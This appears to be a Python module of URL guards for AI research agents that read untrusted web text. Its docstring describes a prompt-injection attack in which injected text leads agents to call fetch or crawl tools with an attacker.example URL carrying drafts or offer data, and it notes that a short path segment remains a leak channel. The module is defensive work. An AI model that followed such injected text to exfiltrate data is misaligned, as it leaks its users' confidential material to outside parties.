"""Guards for tools whose URL arguments are chosen by the model (SEC-20, PIPE-14).

The research/brief/generator agents read untrusted web text. Injected text can ask them to call
`fetch_url_title` / `tavily_extract_tool` / `tavily_crawl_tool` with `https://attacker.example/?d=<context>`
and so smuggle unpublished drafts, brand notes or offer data out in the URL. These guards cannot make that
impossible, but they close the cheap form of it:

* a URL whose host appeared in THIS process's search results is allowed (that is the normal research flow);
* any other URL must be "plain": http(s), no credentials, no query string, no fragment, a short path - it
  cannot carry a payload of any size. Source links from a brief are plain URLs and keep working;
* crawl depth/limit, URL counts and per-run call counts are clamped, so a model cannot turn one metered call
  into hundreds of pages.

Residual risk, stated honestly: data can still ride in a path segment (<=150 chars) of a plain URL to a host
the model chose. The real fix is not giving untrusted-text agents these tools at all; this makes the abuse
small and visible rather than free.
"""
from __future__ import annotations

import os
from collections import deque
from typing import Iterable, Optional
from urllib.parse import urlsplit

MAX_URL_LEN = 400
MAX_PLAIN_PATH = 150
MAX_PLAIN_SEGMENTS = 8
MAX_CRAWL_DEPTH = 3
MAX_CRAWL_LIMIT = 20
MAX_EXTRACT_URLS = 20
MAX_TITLE_FETCHES_PER_RUN = 40

_seen_hosts: "deque[str]" = deque(maxlen=500)
_title_fetches = 0


def _host(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def remember_results(urls: Iterable[str]) -> None:
    """Record the hosts a search returned, so later reads of those pages are allowed."""
    for u in urls or []:
        h = _host(str(u))
        if h and h not in _seen_hosts:
            _seen_hosts.append(h)


def reset() -> None:
    """Forget everything (a new run, or a test)."""
    global _title_fetches
    _seen_hosts.clear()
    _title_fetches = 0


def check_model_url(url: str) -> Optional[str]:
    """None if the model may use this URL, else the reason it may not."""
    if (os.environ.get("URL_GUARD") or "").strip().lower() in ("off", "0", "false"):
        return None
    text = (url or "").strip()
    if not text or len(text) > MAX_URL_LEN:
        return f"URL is empty or longer than {MAX_URL_LEN} characters"
    try:
        parts = urlsplit(text)
    except ValueError:
        return "URL could not be parsed"
    if parts.scheme not in ("http", "https") or not parts.hostname:
        return "only http(s) URLs with a host are allowed"
    if parts.username or parts.password:
        return "URLs with embedded credentials are not allowed"
    if parts.hostname.lower() in _seen_hosts:
        return None
    path = parts.path or ""
    if parts.query or parts.fragment:
        return ("this host did not appear in this run's search results, so only a plain URL (no query string "
                "or fragment) is allowed; use a URL returned by a search")
    if len(path) > MAX_PLAIN_PATH or path.count("/") > MAX_PLAIN_SEGMENTS:
        return "this host did not appear in this run's search results and the URL path is unusually long"
    return None


def clamp_crawl(max_depth: int, limit: int) -> tuple[int, int]:
    try:
        d = int(max_depth)
    except (TypeError, ValueError):
        d = 2
    try:
        n = int(limit)
    except (TypeError, ValueError):
        n = 10
    return max(1, min(MAX_CRAWL_DEPTH, d)), max(1, min(MAX_CRAWL_LIMIT, n))


def crawl_cost(limit: int) -> int:
    """Metered Tavily calls for a crawl: Tavily bills ~1 credit per 5 pages, so a 20-page crawl is not "1 call"."""
    return max(1, -(-int(limit) // 5))


def allow_title_fetch() -> bool:
    """A cap on title fetches per run: each one is an outbound request to a model-chosen host."""
    global _title_fetches
    if _title_fetches >= MAX_TITLE_FETCHES_PER_RUN:
        return False
    _title_fetches += 1
    return True
